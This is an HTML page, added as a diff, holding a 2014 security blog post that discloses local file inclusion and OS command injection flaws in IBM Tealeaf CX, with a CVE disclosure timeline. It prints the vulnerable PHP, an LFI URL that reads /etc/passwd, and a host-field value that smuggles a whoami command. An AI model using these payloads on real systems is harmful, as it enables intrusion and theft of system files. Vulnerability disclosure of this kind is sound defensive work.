@@ -1,0 +1,335 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI - forelsec</title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Tealeaf Technologies was purchased by IBM in May of 2012, and is a customer buying analytics application. Essentially, an administrator will &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="forelsec" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">forelsec</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/code">Code</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">IBM Tealeaf CX (V8 Release 8) Remote OS Command Injection / LFI</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-03-26T23:51:11-06:00" pubdate data-updated="true">Mar 26<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Tealeaf Technologies was <a href="http://techcrunch.com/2012/05/02/ibm-acquires-tealeaf-to-add-customer-buying-analytics-to-smarter-commerce-products/">purchased</a> by IBM in May of 2012, and is a customer buying analytics application.  Essentially, an administrator will configure a Tealeaf server that accepts analytic data from remote servers, which it then generates various models, graphs, reports, etc based on the aggregate of data.
+Their analytics status/server monitoring application is vulnerable to a fairly trivial OS command injection vulnerability, as well as local file inclusion.  This vulnerability was discovered on a PCI engagement against a large retailer; the LFI was used to pull PHP files and hunt for RCE.</p>
+
+<p>The entire application is served up by default on port 8080 and is developed in PHP.  Authentication by default is disabled, however, support for Basic Auth appears to exist.  This interface allows administrators access to statistics, logs, participating servers, and more.  Contained therein is the ability to obtain application logs, such as configuration, maintenance, access, and more.  The log parameter is vulnerable to LFI:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if(array_key_exists("log", $params))
+</span><span class='line'>$path = $config-&gt;logfiledir() . "/" . $params["log"];
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>$file = basename($path);
+</span><span class='line'>$size = filesize($path);
+</span><span class='line'>
+</span><span class='line'>// Set the cache-control and expiration date so that the file expires
+</span><span class='line'>// immediately after download.
+</span><span class='line'>//
+</span><span class='line'>$rfc1123date = gmdate('D, d M Y H:i:s T', 1);
+</span><span class='line'>header('Cache-Control: max-age=0, must-revalidate, post-check=0, pre-check=0');
+</span><span class='line'>header("Expires: " . $rfc1123date);
+</span><span class='line'>
+</span><span class='line'>header("Content-Type: application/octet-stream");
+</span><span class='line'>header("Content-Disposition: attachment; filename=$file;");
+</span><span class='line'>header("Content-Length: $size;");
+</span><span class='line'>
+</span><span class='line'>readfile($path);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The URL then is <code>http://host:8080/download.php?log=../../../etc/passwd</code></p>
+
+<p>Tealeaf also suffers from a rather trivial remote OS command injection vulnerability.  Under the Delivery tab, there exists the option to ping remote servers that send data back to the mothership.  Do you see where this is going?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if ($_POST["perform_action"] == "testconn") {
+</span><span class='line'>    $host = $_POST["testconn_host"];
+</span><span class='line'>    $port = $_POST["testconn_port"];
+</span><span class='line'>    $use_t = strtolower($_POST["testconn_t"]) == "true" ? true : false;
+</span><span class='line'>    $command = $GLOBALS["config"]-&gt;testconn_program() . ' ';
+</span><span class='line'>    if($use_t)
+</span><span class='line'>    $output = trim(shell_command_output($command . $host . " -p " . $port . " -t"));
+</span><span class='line'>    else
+</span><span class='line'>    $output = trim(shell_command_output($command . $host . " -p " . $port));
+</span><span class='line'>
+</span><span class='line'>    if($output != "") {
+</span><span class='line'>        $alert_function = "alert('" . str_replace("\n", "\\n",
+</span><span class='line'>        htmlentities($output, ENT_QUOTES)) . "')";
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    $_SESSION['delivery']-&gt;pending_changes = $orig_pending_changes;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And shell_command_output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function shell_command_output($command) {
+</span><span class='line'>    $result = `$command 2&gt;&1`;
+</span><span class='line'>    if (strlen($result) &gt; 0)
+</span><span class='line'>    return $result;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Harnessing the <code>$host</code> variable, we can inject arbitrary commands to run under the context of the process user, which by default is <code>ctccap</code>.  In order to exploit this without hanging processes or goofing up flow, I injected the following as the host variable: <code>8.8.8.8 -c 1 ; whoami ; ping 8.8.8.8 -c 1</code>.</p>
+
+<h3>Timeline</h3>
+
+
+<ul>
+<li>11/08/2013: IBM vulnerability submitted</li>
+<li>11/09/2013: IBM acknowledge vulnerability and assign internal advisory ID</li>
+<li>12/05/2013: Request for status update</li>
+<li>01/06/2014: Second request for status update</li>
+<li>01/23/2014: IBM responds with a target patch date set for &ldquo;another few months&rdquo;</li>
+<li>03/26/2014: IBM posts advisory, assigns CVE-2013-6719 and CVE-2013-6720</li>
+</ul>
+
+
+<p><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667630">Advisory</a><br/>
+<a href="http://www.exploit-db.com/exploits/32546/">exploit-db PoC</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-03-26T23:51:11-06:00" pubdate data-updated="true">Mar 26<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/command-injection/'>command injection</a>, <a class='category' href='/blog/categories/ibm/'>ibm</a>, <a class='category' href='/blog/categories/lfi/'>lfi</a>, <a class='category' href='/blog/categories/tealeaf/'>tealeaf</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/" data-via="" data-counturl="http://hatRiot.github.io/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/" title="Previous Post: meterpreter shell upgrades using powershell">&laquo; meterpreter shell upgrades using powershell</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/03/26/ibm-tealeaf-cx-remote-os-command-injection-lfi/">IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/10/meterpreter-shell-upgrades-using-powershell/">meterpreter shell upgrades using powershell</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/03/02/introduction/">introduction</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/02/24/ganib-project-management-2.3-sqli/">ganib project management 2.3 SQLi</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/01/26/fetching-jboss-mbean-method-hashes/">Fetching JBoss MBean method hashes</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
